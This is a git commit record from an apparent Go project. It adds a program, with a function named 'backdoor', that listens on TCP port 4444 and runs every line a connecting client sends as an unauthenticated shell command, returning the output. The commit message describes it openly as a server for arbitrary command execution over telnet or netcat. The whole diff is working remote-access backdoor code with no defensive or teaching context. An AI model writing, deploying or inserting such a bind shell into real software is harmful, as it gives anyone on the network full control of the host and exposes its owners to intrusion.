20137ee3ba7c4c78fe5478a9f00c3949481d61d6
Matt Bostock <matt@mattbostock.com>
2015-08-25 23:17:16 +0100

    Add simple TCP server to execute commands
    Create a simple TCP server that executes arbitrary shell commands sent
    to it by a client, i.e. telnet or netcat, and returns the ouput back to
    the client.
    
    Commands are separated by newlines; I'm using the [net/textproto][]
    package, which is designed to help implement text-based protocols, to
    parse the input.
    
    Connections can be closed and new ones reopened as desired. The server
    will remain running indefinitely.
    
    [net/textproto][]: https://golang.org/pkg/net/textproto/

---
+++ main.go
@@ -0,0 +1,52 @@
+package main
+
+import (
+	"bufio"
+	"log"
+	"net"
+	"net/textproto"
+	"os/exec"
+)
+
+func main() {
+	backdoor()
+}
+
+func backdoor() {
+	ln, err := net.Listen("tcp", ":4444")
+	if err != nil {
+		log.Fatalln(err)
+	}
+
+	for {
+		conn, err := ln.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		go handleConnection(conn)
+	}
+}
+
+func handleConnection(conn net.Conn) {
+	reader := bufio.NewReader(conn)
+	tp := textproto.NewReader(reader)
+
+	for {
+		input, err := tp.ReadLine()
+		if err != nil {
+			log.Println("Error reading:", err.Error())
+			break
+		}
+
+		cmd := exec.Command("/usr/bin/env", "sh", "-c", input)
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			conn.Write([]byte(err.Error() + "\n"))
+		}
+
+		conn.Write(output)
+	}
+
+	conn.Close()
+}
